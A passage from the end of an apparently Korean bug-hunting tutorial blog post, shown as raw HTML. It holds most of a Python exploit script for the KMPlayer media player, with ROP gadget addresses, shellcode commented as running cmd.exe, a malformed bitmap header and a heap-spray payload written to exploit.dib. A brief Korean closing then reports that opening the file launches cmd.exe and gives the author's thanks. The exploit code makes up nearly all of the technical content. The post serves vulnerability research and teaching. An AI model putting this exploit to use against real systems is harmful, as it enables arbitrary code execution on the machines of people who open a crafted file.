	<span class="hljs-number">0x0068c402</span>, <span class="hljs-comment"># POP EAX # RETN [KMPlayer.exe]</span>
	<span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span>
	<span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>
	]
	<span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(pack(<span class="hljs-string">&apos;&lt;I&apos;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)

<span class="hljs-comment">#shellcode for runnig cmd.exe</span>
shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>
shellcode += <span class="hljs-string">&quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&quot;</span>
shellcode += <span class="hljs-string">&quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&quot;</span>
shellcode += <span class="hljs-string">&quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&quot;</span>
shellcode += <span class="hljs-string">&quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&quot;</span>
shellcode += <span class="hljs-string">&quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&quot;</span>
shellcode += <span class="hljs-string">&quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&quot;</span>
shellcode += <span class="hljs-string">&quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&quot;</span>
shellcode += <span class="hljs-string">&quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&quot;</span>
shellcode += <span class="hljs-string">&quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&quot;</span>
shellcode += <span class="hljs-string">&quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&quot;</span>
shellcode += <span class="hljs-string">&quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&quot;</span>
shellcode += <span class="hljs-string">&quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&quot;</span>
shellcode += <span class="hljs-string">&quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&quot;</span>
shellcode += <span class="hljs-string">&quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&quot;</span>
shellcode += <span class="hljs-string">&quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&quot;</span>
shellcode += <span class="hljs-string">&quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&quot;</span>
shellcode += <span class="hljs-string">&quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&quot;</span>

p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)
up = <span class="hljs-keyword">lambda</span> x : unpack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)[<span class="hljs-number">0</span>]

rop_chain = create_rop_chain()

BITMAPFILEHEADER = OrderedDict()
BITMAPINFOHEADER = OrderedDict()

BITMAPINFOHEADER[<span class="hljs-string">&apos;biSize&apos;</span>] = <span class="hljs-string">&apos;\x28\x1f\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x28</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)
BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)
BITMAPINFOHEADER[<span class="hljs-string">&apos;biPlanes&apos;</span>] = <span class="hljs-string">&apos;\x01\x00&apos;</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biBitCount&apos;</span>] = <span class="hljs-string">&apos;\x18\x00&apos;</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biCompression&apos;</span>] = <span class="hljs-string">&apos;\x00\x0a\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>]) *
up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>])))
BITMAPINFOHEADER[<span class="hljs-string">&apos;biXPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biYPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrUsed&apos;</span>] = <span class="hljs-string">&apos;\x00\x02\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>
BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrImportant&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>

BITMAPFILEHEADER[<span class="hljs-string">&apos;bfType&apos;</span>] = <span class="hljs-string">&apos;BM&apos;</span>
BITMAPFILEHEADER[<span class="hljs-string">&apos;bfsize&apos;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) + <span class="hljs-number">0x36</span>)
BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved1&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>
BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved2&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>
BITMAPFILEHEADER[<span class="hljs-string">&apos;bfOffBits&apos;</span>] = <span class="hljs-string">&apos;\x36\x00\x00\x00&apos;</span>

head = <span class="hljs-string">&apos;Fandu_&apos;</span>
tail = <span class="hljs-string">&apos;FANDU_&apos;</span>
spray = <span class="hljs-string">&apos;\x11&apos;</span>
stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>
heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>
pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>
ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment"># RETN</span>
offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>
offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>

payload = <span class="hljs-string">&apos;&apos;</span>
payload += head +<span class="hljs-string">&apos;aa&apos;</span>
payload += spray * offset1
payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)
payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)
payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)
payload += rop_chain
payload += shellcode
payload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>
payload += tail

exploit = <span class="hljs-string">&apos;&apos;</span>

<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :
	exploit += BITMAPFILEHEADER[key]

<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPINFOHEADER.keys() :
	exploit += BITMAPINFOHEADER[key]

exploit += payload

f = open(<span class="hljs-string">&apos;./exploit.dib&apos;</span>, <span class="hljs-string">&apos;wb&apos;</span>)
f.write(exploit)
f.close()</code></pre>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; &#xB5A8;&#xAD88;&#xC9C4; <code>exploit.dib</code> &#xD30C;&#xC77C;&#xC744; KMPlayer&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!!</p>
<p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--076.png"></p>
<p>&#xC774;&#xB807;&#xAC8C; <code>cmd.exe</code>&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;!!! &#xC9DD;&#xC9DD;&#xC9DD; &#x314E;&#x314E;&#x314E;&#x314E;&#x314E;&#x314E;</p>
<h1 id="&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;"><a href="#&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;" class="headerlink" title="&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;"></a>&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;</h1><p>&#xC73C;&#xC73C; &#xB4DC;&#xB514;&#xC5B4; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#x314B;&#x314B; &#xC6D0;&#xB798; 12 &#xC6D4; &#xC911;&#xC21C;&#xC778;&#xAC00; &#xB9D0;&#xC778;&#xAC00; &#xC2DC;&#xC791;&#xD588;&#xB294; &#xB370; 1 &#xC6D4;&#xC5D0; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00; &#xC788;&#xC5B4; &#xAC00;&#xC9C0;&#xACE0; &#xC774;&#xC81C;&#xC57C; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#xD6C4;&#xC6B0;&#x2026; &#xC5ED;&#xC2DC; &#xB098; &#xC0C8;&#xB07C;&#xB294; &#xAC8C;&#xC73C;&#xB978; &#xB188;&#x2026;.</p>
<p>&#xC6D0;&#xB798; &#xC774; &#xAE00;&#xC744; &#xC4F4; &#xC774;&#xC720;&#xAC00; &#xB3D9;&#xC544;&#xB9AC; &#xD6C4;&#xBC30;&#xB4E4; &#xAD50;&#xC721;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xC0AC;&#xC2E4; &#xC804;&#xC5D0; cdpython &#xD615;&#xC774; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xAE00; &#xC4F0;&#xBA74; &#xC88B;&#xC744; &#xAC70; &#xAC19;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xC4F0;&#xAC8C; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xB9CE;&#xC740; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xC694;&#xC998; &#xB108;&#xBB34; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC774;&#xB7F0; &#xAC70; &#xBCF4;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xC788;&#xACA0;&#xB0D0;&#xB9CC;&#xC740;&#x2026; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xC774;&#xAC70; &#xBCF4;&#xC9C0;&#xB3C4; &#xC54A;&#xACA0;&#xC9C0;&#x2026; &#xC96C;&#xB975; &#xB098;&#xB3C4; &#xC774;&#xC81C; &#xC798;&#xD574;&#xC57C;&#xC9C0;&#x2026;. &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC77C;&#xB2E8; &#xC878;&#xC5C5;&#xBD80;&#xD130; &#xD558;&#xC988;&#xC544;&#xC544;&#xC544;&#xC544; &#x3160;&#x3160;&#x3160;&#x3160;</p>
<p>&#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC774; &#xC815;&#xB3C4;&#xB77C;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xCC44;&#xCC0D;&#xC9C8; &#xD574;&#xC900; passket, combabo, cdpython, morinori89 &#xD615;&#xB4E4; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2FC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xD6C4;&#xC6B0;&#x2026;. &#xC0AC;&#xC2E4; &#xD615;&#xB4E4;&#xC774;&#xB791; &#xC81C;&#xC77C; &#xB9CE;&#xC774; &#xD55C; &#xAC70;&#xB294; &#xD574;&#xD0B9;&#xBCF4;&#xB2E4;&#xB294; &#xC220; &#xCC98;&#xBA39;&#xB294; &#xAC70; &#xAC19;&#xC9C0;&#xB9CC;&#x2026;. &#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC11C; &#xD53C;&#xB4DC;&#xBC31; &#xC900; SSG &#xD6C4;&#xBC30;&#xB4E4; Frozenbeer &#xB561;&#xD050;&#xB561;&#xD050; &#x314B;&#x314B;&#x314B;</p>
<p>&#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC990;&#xD58C;!!!</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                  
                  <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                  
                  <a class="hover-with-bg" href="/tags/research/">research</a>
                  
                  <a class="hover-with-bg" href="/tags/bug-hunting/">bug hunting</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_L0ch.jpg" srcset="/img/loading.gif" alt="L0ch">
                  </div>

                  <div class="link-text">
                    <div class="link-title">L0ch</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/L0ch">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>

              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2021/04/01/idioth/2021-04-01/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[]      VSingle, ValeforBeta</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2021/03/31/fabu1ous/2021-03-31/">
                    <span class="hidden-mobile">[] CVE-2021-25646: Apache Druid    </span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/';
        this.page.identifier = '/2021/03/31/l0ch/bughunting-tutorials-part4/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research]   Part 4&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
